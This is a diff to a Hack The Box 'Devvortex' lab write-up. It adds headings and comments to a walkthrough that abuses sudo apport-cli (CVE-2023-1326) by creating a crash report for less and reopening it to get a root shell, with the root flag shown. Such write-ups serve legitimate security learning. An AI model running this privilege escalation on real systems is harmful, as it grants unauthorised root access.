@@ -436,8 +436,11 @@ User logan may run the following commands on devvortex:
 
 > [CVE-2023-1326](https://nvd.nist.gov/vuln/detail/CVE-2023-1326#:~:text=Description,local%20attacker%20can%20escalate%20privilege.): [PoC](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb)
 
+
+### Creating and keeping a crash report (using `less`).
+
 ```shell
-# create a crash file
+# create a crash file for less
 logan@devvortex:/$ sudo /usr/bin/apport-cli /usr/bin/less
 sudo /usr/bin/apport-cli /usr/bin/less
 
@@ -453,10 +456,16 @@ What would you like to do? Your options are:
   K: Keep report file for sending later or copying to somewhere else
   I: Cancel and ignore future crashes of this program version
   C: Cancel
+# choosing to keep the report
 Please choose (S/V/K/I/C): k
 k^J
+# the crash file, i.e., report, is generated
 Problem report file: /tmp/apport.less.2gv7a9ri.apport
+```
 
+### Then you can use the exploit as explained [here](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb) using the newly-generated report:
+
+```shell
 # use the exploit
 logan@devvortex:/$ sudo /usr/bin/apport-cli -c /tmp/apport.less.2gv7a9ri.apport
 </bin/apport-cli -c /tmp/apport.less.2gv7a9ri.apport
@@ -479,7 +488,7 @@ uid=0(root) gid=0(root) groups=0(root)
 !ccaatt  //rroooott//rroooott..ttxxtt!cat /root/root.txt
 a018baec037ce9a218071e0b308efdc1
 !done  (press RETURN)
-``` -->
+```
 
 <figure>
     <img src="devvortex_pwned.png"
